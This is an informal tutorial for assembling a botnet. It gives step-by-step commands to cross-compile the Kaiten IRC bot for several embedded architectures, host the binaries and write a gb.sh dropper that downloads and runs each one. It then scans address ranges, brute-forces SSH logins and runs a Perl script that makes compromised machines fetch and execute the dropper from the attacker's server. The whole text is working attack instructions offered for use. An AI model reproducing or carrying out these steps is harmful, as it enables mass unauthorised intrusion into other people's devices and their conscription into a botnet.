
unzip it and rename it to whatever you want, something short makes it easier but of course you can always leave it as it is

Next you want to cd into LA (im going to call the aidra folder LA for the sake of this tutorial) then type make sure to leave out the ' 

type ' mkdir bin ' then you want to cd into bin and type nano s.sh and copy this 

wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 && tar -xvjf cross-compiler-mips.tar.bz2 && rm -rf cross-compiler-mips.tar.bz2

wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2 && tar -xvjf cross-compiler-mipsel.tar.bz2 && rm -rf cross-compiler-mipsel.tar.bz2

wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2 && tar -xvjf cross-compiler-armv5l.tar.bz2 && rm -rf cross-compiler-armv5l.tar.bz2

wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2 && tar -xvjf cross-compiler-powerpc.tar.bz2 && rm -rf cross-compiler-powerpc.tar.bz2

wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2 && tar -xvjf cross-compiler-sh4.tar.bz2 && rm -rf cross-compiler-sh4.tar.bz2

wget http://uclibc.org/downloads/binaries/0.9...32.tar.bz2 && tar -xvjf cross-compiler-x86_32.tar.bz2 && rm cross-compiler-x86_32.tar.bz2

Oka once you have pasted that you then want to save it and chmod it, and type ' sh s.sh ' then let it do its thing 

after that you need to configure your kaiten.c to your IRC, kaiten can be found here ftp://109.235.50.139/pub/kaiten.c

once you have it configured upload it to your FTP on your server and copy the link for it

Now your going to want to cd into /root/LA/bin after that your going to want to cd into every cross compiler and compile it, example 

[root@Psychopath bin]# cd cross-compiler-mipsel/bin 
[root@Psychopath bin]# wget ftp://FTPLINKforKaiten
[root@Psychopath bin]# ./mipsel-gcc -o mipsel kaiten.c
Now for powerpc it would look like

[root@Psychopath bin]# cd cross-compiler-powerpc/bin 
[root@Psychopath bin]# wget ftp://FTPLINKforKaiten
[root@Psychopath bin]# ./powerpc-gcc -o powerpc kaiten.c 

Get the picture?

Now when youve compilied it, its gonna give you a file thats the name of the cross compiler, so for example after i run ./mipsel-gcc -o mipsel kaiten.c it will give me a file called mipsel, that file is your compiled kaiten that we will be using in botex

What i reccomend doing is typing ' mkdir /root/Compiled ' and moving all the compiled bots into there, so heres what that would look like 

[root@Psychopath bin]# mkdir /root/Compiled
[root@Psychopath bin]# mv mipsel /root/Compiled

Get the picture?

now after that i need to install httpd, so type ' yum install httpd -y ' then type ' service httpd start ' if it says [ OK ] then you are good, it it says failed then says you need to edit your http config or some shit, use an OVH, i am not fully aware of how to fix it just yet.

now you want to cd into your Compiled folder and move everything to your /var/www/html/ So that would look like

[root@Psychopath Compiled]# mv mips mipsel sh4 powerpc x86_64 armv5l /var/www/html/

Get the picture? 

So now you want to type ' cd /var/www/html/ ' and then type ' nano gb.sh ' and then edit and copy this 

#!/bin/sh

wget -c http://yourHTTPlink/armv5l -P /var/run && chmod +x /var/run/armv5l && /var/run/armv5l
wget -c http://yourHTTPlink/mips -P /var/run && chmod +x /var/run/mips && /var/run/mips
wget -c http://yourHTTPlink/mipsel -P /var/run && chmod +x /var/run/mipsel && /var/run/mipsel
wget -c http://yourHTTPlink/powerpc -P /var/run && chmod +x /var/run/powerpc && /var/run/powerpc
wget -c http://yourHTTPlink/sh4 -P /var/run && chmod +x /var/run/sh4 && /var/run/sh4
wget -c http://yourHTTPlink/x86_64 -P /var/run && chmod +x /var/run/x86_64 && /var/run/x86_64

sleep 3;
rm -fr /var/run/gb.sh

After that you want to save it and chmod 777 * 

now that we have done that we can move along to installing every thing for botex

Heres is everything needed to install BotEx

cpan force install IO::Socket

cpan force install IO::Select 

cpan force install Parallel::ForkManager

cpan force install Net::SSH2

if it says " No makefile was created " or some shit after you tried to install net:ssh2 

do all of these commands in order one after another

yum install gcc php-devel php-pear libssh2 libssh2-devel

pecl install -f ssh2

touch /etc/php.d/ssh2.ini

echo extension=ssh2.so > /etc/php.d/ssh2.ini

after that run cpan force install Net::SSH2 again and it should work

now your going to want to put your LRAB folder onto your server and put wget.pl in it

now in yout wget.pl file your going to look for line 26 and it should look like this 

channel->exec('cd /tmp && wget http://yourHTTPlink/gb.sh && sh gb.sh && rm -rf gb.sh');

once you have changed it your done with the setup, now we need to make lists 

To do so type

./class PORT -a RANGE -i INTERFACE -s 10

once thats done scanning your range you want to type

./go then it will ask your for ' Max Process ' you can enter any number 1 up to 1000 i rekon 500 or 1000 depending on server speed, let it brute force for a while 

after its done brute forcing you want to nano into wget.pl and look on line 11 it should look like 

open(fh,'<','vulnlistname.txt'); @newarray; while (<fh>){ @array = split(':',$_);

just edit it to your vuln list name and save it and then type perl wget.pl and your done!!